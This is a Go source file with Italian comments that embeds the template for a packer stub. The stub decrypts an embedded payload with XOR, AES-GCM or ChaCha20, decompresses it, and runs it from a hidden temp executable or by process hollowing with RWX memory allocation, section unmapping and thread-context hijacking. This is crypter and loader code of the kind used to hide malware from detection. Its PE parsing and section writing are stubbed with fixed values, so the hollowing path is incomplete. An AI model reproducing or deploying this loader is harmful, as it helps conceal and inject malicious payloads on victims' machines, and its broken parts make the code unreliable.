package pack

// PEStubTemplate contiene il template base per lo stub PE
// Questo codice verrà compilato e iniettato con il payload compresso/cifrato

const PEStubSource = `
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"io"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
	
	"github.com/ulikunitz/xz"
	"golang.org/x/crypto/chacha20poly1305"
)

// Metadata embedded dal packer (sostituiti al build time)
var (
	encryptedPayload = []byte{/* PAYLOAD_PLACEHOLDER */}
	encryptionKey    = []byte{/* KEY_PLACEHOLDER */}
	encryptionNonce  = []byte{/* NONCE_PLACEHOLDER */}
	originalSize     = uint64(/* SIZE_PLACEHOLDER */)
	compressionAlgo  = "/* COMP_ALGO_PLACEHOLDER */"
	encryptionAlgo   = "/* ENC_ALGO_PLACEHOLDER */"
	paddingOffsets   = []int{/* PADDING_PLACEHOLDER */}
	useInMemory      = false // /* INMEMORY_PLACEHOLDER */
)

// Windows API
var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	procCreateProcess   = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
	procGetThreadCtx    = kernel32.NewProc("GetThreadContext")
	procSetThreadCtx    = kernel32.NewProc("SetThreadContext")
	procResumeThread    = kernel32.NewProc("ResumeThread")
	procNtUnmapView     = ntdll.NewProc("NtUnmapViewOfSection")
)

func main() {
	// 1. Decifra payload
	decrypted, err := decrypt(encryptedPayload, encryptionKey, encryptionNonce, encryptionAlgo)
	if err != nil {
		os.Exit(1)
	}
	
	// 2. Decomprimi
	decompressed, err := decompress(decrypted, compressionAlgo)
	if err != nil {
		os.Exit(1)
	}
	
	// 3. Rimuovi padding
	cleaned := removePadding(decompressed, paddingOffsets)
	
	// 4. Esegui
	if useInMemory {
		executeProcessHollowing(cleaned)
	} else {
		executeFromTemp(cleaned)
	}
}

// decrypt decifra il payload
func decrypt(data, key, nonce []byte, algo string) ([]byte, error) {
	switch algo {
	case "xor":
		return decryptXOR(data, key), nil
	case "aes-256-gcm":
		return decryptAES(data, key, nonce)
	case "chacha20":
		return decryptChaCha(data, key, nonce)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func decryptXOR(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func decryptAES(data, key, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

func decryptChaCha(data, key, nonce []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}
	return aead.Open(nil, nonce, data, nil)
}

// decompress decomprime il payload
func decompress(data []byte, algo string) ([]byte, error) {
	switch algo {
	case "xz", "lzma":
		r, err := xz.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		return io.ReadAll(r)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func removePadding(data []byte, offsets []int) []byte {
	if len(offsets) == 0 {
		return data
	}
	// Implementazione semplificata
	return data
}

// executeProcessHollowing esegue il payload usando Process Hollowing
// Tecnica: crea processo sospeso, unmap originale, mappa nuovo PE, resume
func executeProcessHollowing(payload []byte) {
	// 1. Crea processo sospeso (usa se stesso come host)
	exePath, _ := os.Executable()
	
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	
	// CREATE_SUSPENDED = 0x4
	err := createProcess(
		syscall.StringToUTF16Ptr(exePath),
		nil,
		nil,
		nil,
		false,
		0x4, // CREATE_SUSPENDED
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		os.Exit(1)
	}
	
	// 2. Unmap processo originale
	ntUnmapViewOfSection(pi.Process, getImageBase(payload))
	
	// 3. Alloca memoria per nuovo PE
	imageBase := getImageBase(payload)
	imageSize := getImageSize(payload)
	
	newBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		imageBase,
		uintptr(imageSize),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	
	// 4. Scrivi headers
	writeProcessMemory(pi.Process, newBase, payload[:0x1000])
	
	// 5. Scrivi sezioni
	writeSections(pi.Process, newBase, payload)
	
	// 6. Fix relocations e IAT
	// (implementazione semplificata, vedi goffloader per versione completa)
	
	// 7. Modifica entry point
	var ctx context
	ctx.ContextFlags = 0x10007 // CONTEXT_FULL
	procGetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	
	entryPoint := getEntryPoint(payload)
	ctx.Rcx = newBase + uintptr(entryPoint)
	
	procSetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	
	// 8. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))
}

// executeFromTemp esegue il payload da file temporaneo
func executeFromTemp(payload []byte) {
	tmp, err := os.CreateTemp("", ".tmp-*.exe")
	if err != nil {
		os.Exit(1)
	}
	tmpPath := tmp.Name()
	
	tmp.Write(payload)
	tmp.Close()
	
	cmd := exec.Command(tmpPath, os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	
	cmd.Run()
	os.Remove(tmpPath)
}

// Helper per Process Hollowing
type context struct {
	ContextFlags uint32
	_            [6]uint64
	Rax          uintptr
	Rcx          uintptr
	Rdx          uintptr
	Rbx          uintptr
	Rsp          uintptr
	Rbp          uintptr
	Rsi          uintptr
	Rdi          uintptr
	R8           uintptr
	R9           uintptr
	R10          uintptr
	R11          uintptr
	R12          uintptr
	R13          uintptr
	R14          uintptr
	R15          uintptr
}

func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.SecurityAttributes,
	inheritHandles bool, flags uint32, env *uint16, dir *uint16,
	si *syscall.StartupInfo, pi *syscall.ProcessInformation) error {
	
	r1, _, e1 := procCreateProcess.Call(
		uintptr(unsafe.Pointer(name)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(unsafe.Pointer(procAttr)),
		uintptr(unsafe.Pointer(threadAttr)),
		boolToUintptr(inheritHandles),
		uintptr(flags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(dir)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func ntUnmapViewOfSection(process syscall.Handle, base uintptr) {
	procNtUnmapView.Call(uintptr(process), base)
}

func writeProcessMemory(process syscall.Handle, base uintptr, data []byte) {
	procWriteProcessMem.Call(
		uintptr(process),
		base,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0,
	)
}

func getImageBase(pe []byte) uintptr {
	// Parse PE header per ottenere ImageBase
	// Implementazione semplificata
	return 0x400000
}

func getImageSize(pe []byte) uintptr {
	// Parse PE header per ottenere SizeOfImage
	return uintptr(len(pe))
}

func getEntryPoint(pe []byte) uintptr {
	// Parse PE header per ottenere AddressOfEntryPoint
	return 0x1000
}

func writeSections(process syscall.Handle, base uintptr, pe []byte) {
	// Scrivi ogni sezione PE nel processo
	// Implementazione semplificata
}

func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}
`

// GetPEStubSource ritorna il codice sorgente dello stub PE
func GetPEStubSource() string {
	return PEStubSource
}
